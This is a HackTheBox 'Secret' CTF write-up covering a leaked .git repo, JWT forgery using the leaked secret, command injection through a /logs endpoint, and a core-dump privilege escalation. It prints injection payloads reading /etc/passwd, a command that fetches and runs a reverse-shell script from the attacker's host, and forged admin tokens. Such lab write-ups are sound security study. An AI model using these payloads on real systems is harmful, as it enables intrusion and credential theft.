---
title: Secret Hackthebox
date: 26-11-2021
categories: [hackthebox,writeup]
tags: [.git,JWT token,source code review,core dump]
---

# Secret

![Secret info card](/assets/img/secret/secret.png)

Secret is an easy machine on Hackthebox. Started with .git expose and use gittools to extract the repository. Review the source code from the repository and found lot of endpoints. The JSON Web Token will be generate and it help us to manipulate and perform remote code execution then use to get reverse shell. To escalate to root then we need to code review of c program. From that we find that we need to crash the program then it allows us to see the content of the memory via core dump. Then can get the root flag.

## **Recon**

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc+UtqNVYIrxJx+2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK+oAgE7wbv++el2WeD1DF8gw+GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe+TsG/8O/GFgNXU1WqFYGe4xl+MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V+NQ/7EJYJPMeugOtbputyZMH+jALhzxBs07JLbw8Bh9JX+ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN+AsoE7k+uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY+DgpVElkr0vVa+3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0+oeMOlJN+k=
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa+8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0=
|   256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr+32BQ9R/2lS/Mu33ExJwsci
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Check the http web and found some download button and it shows that the download button have source code.

![Untitled](/assets/img/secret/Untitled.png)

In the unzip file we can see the .git dir so we can extract it with gitTools. https://github.com/internetwache/GitTools

The extractor section will extract commits and their content from a broken repository.

![Extract the source code from the commits](/assets/img/secret/Untitled%201.png)

Extract the source code from the commits

![Untitled](/assets/img/secret/Untitled%202.png)

Extract all the commit source code need to do enumeration. We got lot of endpoint and do not know how to exploit. In `forgot.js` file we see the a condition to check the name of the user.

![Untitled](/assets/img/secret/Untitled%203.png)

`private.js` file have have the check role condition where if the user is theadmin we can get the flag??

```bash
#private.js
if (name == 'theadmin'){
        res.json({
            role:{

                role:"you are admin", 
                desc : "{flag will be here}"
            }
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }

})
```

Theres a file which is `verifytoke.js` who verify jwt token and the code shows that to pass the verify token we need to have TOKEN_SECRET. Since `.env` have the token_secret maybe we can bypass the verification.

```bash
#verifytoken.js 
const jwt = require("jsonwebtoken");

module.exports = function (req, res, next) {
    const token = req.header("auth-token");
    if (!token) return res.status(401).send("Access Denied");

    try {
        const verified = jwt.verify(token, process.env.TOKEN_SECRET);
        req.user = verified;
        next();
    } catch (err) {
        res.status(400).send("Invalid Token");
    }
};
```

First of all we can see the `/login` and `/register` so we need to register first then this will generate the jwt token from our credentials. 

```bash
#auth.js
router.post('/register', async (req, res) => {                                                                       
                                                          
    // validation                                                                                                    
    const { error } = registerValidation(req.body)                                                                   
    if (error) return res.status(400).send(error.details[0].message);                                                
                                                                                                                     
    // check if user exists                                                                                          
    const emailExist = await User.findOne({email:req.body.email})                                                    
    if (emailExist) return res.status(400).send('Email already Exist')
                                                                                                                     
    // check if user name exist                                                                                      
    const unameexist = await User.findOne({ name: req.body.name })                                                   
    if (unameexist) return res.status(400).send('Name already Exist')
                                                                                                                     
    //hash the password                                                                                              
    const salt = await bcrypt.genSalt(10);                                                                           
    const hashPaswrod = await bcrypt.hash(req.body.password, salt)
                                                                                                                     
                                                                                                                                                                                                                                               //create a user                                                                                                                                                                                                                            const user = new User({  
        name: req.body.name,                              
        email: req.body.email,                                                                                       
        password:hashPaswrod
    });                                                   
                                                          
    try{                                    
        const saveduser = await user.save();
        res.send({ user: user.name})
     
    }          
    catch(err){         
        console.log(err)
    }                                                     
                                                          
});
```

The `/login` check all the information if its valid also check the jwt token too.

```bash
#auth.js
router.post('/login', async  (req , res) => {             
                                                          
    const { error } = loginValidation(req.body)                                                                      
    if (error) return res.status(400).send(error.details[0].message);

    // check if email is okay 
    const user = await User.findOne({ email: req.body.email })
    if (!user) return res.status(400).send('Email is wrong');

    // check password 
    const validPass = await bcrypt.compare(req.body.password, user.password)
    if (!validPass) return res.status(400).send('Password is wrong');

    // create jwt 
    const token = jwt.sign({ _id: user.id, name: user.name , email: user.email}, process.env.TOKEN_SECRET )
    res.header('auth-token', token).send(token);
```

Try curl command and it always return the page of the website. The command is 

```bash
#It always return source code of the page.
curl -X POST http://10.10.11.120/login -H 'Content-Type: application/json' -d '{"name":"theadmin","email":"theadmin@dasith.works","password":"admin1234"}'
```

I wonder what is wrong so i check again all the source code file. Found in index.js theres an `api` that has been declare and it for all the file in `/routes/auth` .

```bash
// import routs 
const authRoute = require('./routes/auth');  <<<
const webroute = require('./src/routes/web')

dotenv.config();
//connect db 

mongoose.connect(process.env.DB_CONNECT, { useNewUrlParser: true }, () =>
    console.log("connect to db!")
);

//middle ware 
app.use(express.json());
app.use('/api/user',authRoute)  <<<
app.use('/api/', privRoute)
app.use('/', webroute)
```
## **Foothold**

Thats when i realize need to add `/api/user` .

```bash
#Output of the curl command with the API
curl -X POST http://10.10.11.120/api/user/register -H 'Content-Type: application/json' -d '{"name":"theadmin","email":"theadmin@dasith.works","password":"admin1234"}'
Name already Exist
```

It shows that it already exist. We need to login as theadmin so we can get the role privilage so in order to bypass the condition I set one space infront of theadmin name. and register it with the curl command.

```bash
root@Rav3nCLaW [10:52:19 AM] [~/Documents/htb/secret] 
-> # curl -X POST http://10.10.11.120/api/user/register -H 'Content-Type: application/json' -d '{"name":" theadmin","email":"admin@dasith.works","password":"admin1234"}'                                                                 
{"user":" theadmin"}
```

Then login into it and we get the jwt token

```bash
root@Rav3nCLaW [10:56:42 AM] [~/Documents/htb/secret] 
-> # curl -X POST http://10.10.11.120/api/user/login -H 'Content-Type: application/json' -d '{"email":"admin@dasith.works","password":"admin1234"}'
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJmZWZlOGQ3YTU3MTA0NjE1NTUyNWMiLCJuYW1lIjoiIHRoZWFkbWluIiwiZW1haWwiOiJhZG1pbkBkYXNpdGgud29ya3MiLCJpYXQiOjE2Mzk5NjkwMDV9.MRp-w0TwkkQCnaU-FXpb8GuUA-WG-2fuFFTG7fPFB2
```

From the [jwt.io](http://jwt.io) we can see that theadmin name have one space and we can get the jwt  token.

![Payload of the curl command](/assets/img/secret/Untitled%204.png)

Payload of the curl command

But as we check for the privilage we do not get `theadmin` privilage. I guess because we put space and we do not get that.  I erase the space and try it again but it return invalid token. 

```bash
root@Rav3nCLaW [11:05:26 AM] [~/Documents/htb/secret] 
-> # curl http://10.10.11.120/api/priv -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJmZWZlOGQ3YTU3MTA0NjE1NTUyNWMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGRhc2l0aC53b3JrcyIsImlhdCI6MTYzOTk2OTAwNX0.2_lODVTEONZFoluz_xGgc5w90ChYO56_p4pRR9iYDxA'
Invalid Token
```

As for now we can change the payload data and we get the secret token and I put the secret token to verify the signature. Get the new token and try it as before.

```bash
curl http://10.10.11.120/api/priv -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJmZWZlOGQ3YTU3MTA0NjE1NTUyNWMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGRhc2l0aC53b3JrcyIsImlhdCI6MTYzOTk2OTAwNX0.J98EPAjVQ7KJwK2i0OC9BQ2CSqav7I3T6Tq0dyZ_YT0'
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
```

Yeayy got it but what to do next ??? As idk what to do i found somethin new in `/2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b/routes/private.js` 

```bash
const router = require('express').Router();
const verifytoken = require('./verifytoken')
const User = require('../model/user');

router.get('/priv', verifytoken, (req, res) => {
   // res.send(req.user)

    const userinfo = { name: req.user }

    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        res.json({
            creds:{
                role:"admin", 
                username:"theadmin",
                desc : "welcome back admin,"
            }
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})

router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;   <<<
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})

router.use(function (req, res, next) {
    res.json({
        message: {

            message: "404 page not found",
            desc: "page you are looking for is not found. "
        }
    })
});

module.exports = router
```

Guess not all commit show another have of this private.js code. As for the code it use the get method with `/logs` and the code with `req.query.file` think will be parameter for the logs get method. 

```bash
#get rce 
root@Rav3nCLaW [11:31:55 AM] [~/Documents/htb/secret] 
-> # curl http://10.10.11.120/api/logs\?file\=\;cat+/etc/passwd -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJmZWZlOGQ3YTU3MTA0NjE1NTUyNWMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGRhc2l0aC53b3JrcyIsImlhdCI6MTYzOTk2OTAwNX0.J98EPAjVQ7KJwK2i0OC9BQ2CSqav7I3T6Tq0dyZ_YT0'
"80bf34c fixed typos 🎉\n0c75212 now we can view logs from server 😃\nab3e953 Added the codes\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nsystemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:106::/nonexistent:/usr/sbin/nologin\nsyslog:x:104:110::/home/syslog:/usr/sbin/nologin\n_apt:x:105:65534::/nonexistent:/usr/sbin/nologin\ntss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false\nuuidd:x:107:112::/run/uuidd:/usr/sbin/nologin\ntcpdump:x:108:113::/nonexistent:/usr/sbin/nologin\nlandscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin\npollinate:x:110:1::/var/cache/pollinate:/bin/false\nusbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\ndasith:x:1000:1000:dasith:/home/dasith:/bin/bash\nlxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false\nmongodb:x:113:117::/var/lib/mongodb:/usr/sbin/nologin\n
```

Now we can get the reverse shell and we can get it with our own bash reverse shell where we curl our file to the machine and execute it. 

```bash
root@Rav3nCLaW [11:49:57 PM] [~/Documents/htb/secret] 
-> # curl http://10.10.11.120/api/logs\?file\=\|curl%20http://10.10.14.84:8000/revshell.sh%20%7C%20bash -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWMwYTRiZTRhZmVhODA0M2VlMDEzNjIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGRhc2l0aC53b3JrcyIsImlhdCI6MTY0MDAxNTA1OH0.FL2H-2FwHFWTa1gz9PRrYWRrgKk1QlOIJM1kwWj29Q0'
```

![Untitled](/assets/img/secret/Untitled%205.png)

## **Privilage escalation**

The root privesc is not easy and I run the linpeas to check the possible outcome to privesc.

Found c program in /opt directory then in the code there is a function that can be use to get the code dump of the program.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}

void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}

int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1); <<<< 
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
```

Meaning of the function [https://www.tutorialspoint.com/unix_system_calls/prctl.htm](https://www.tutorialspoint.com/unix_system_calls/prctl.htm)

![Untitled](/assets/img/secret/Untitled%206.png)

The idea is to make the program crash and the program will return the core dump in `/var/crash` The idea to crash it because the file of the cannot be write and since the function of pcrtl got in the code maybe it is the way.

[https://unix.stackexchange.com/questions/139071/what-are-the-files-located-in-var-crash](https://unix.stackexchange.com/questions/139071/what-are-the-files-located-in-var-crash)

[https://wiki.ubuntu.com/CrashReporting](https://wiki.ubuntu.com/CrashReporting)

![Untitled](/assets/img/secret/Untitled%207.png)

Run the count program and check the PID of the program to make it crash

```bash
kill -SEGV 45739
```

![Untitled](/assets/img/secret/Untitled%208.png)

After kill the process we know that crash dump at the kernel will be at the `/var/crash` . Then use the apport-unpack to extract the core dump.

![Untitled](/assets/img/secret/Untitled%209.png)

![Untitled](/assets/img/secret/Untitled%2010.png)

Get the flag and submit it.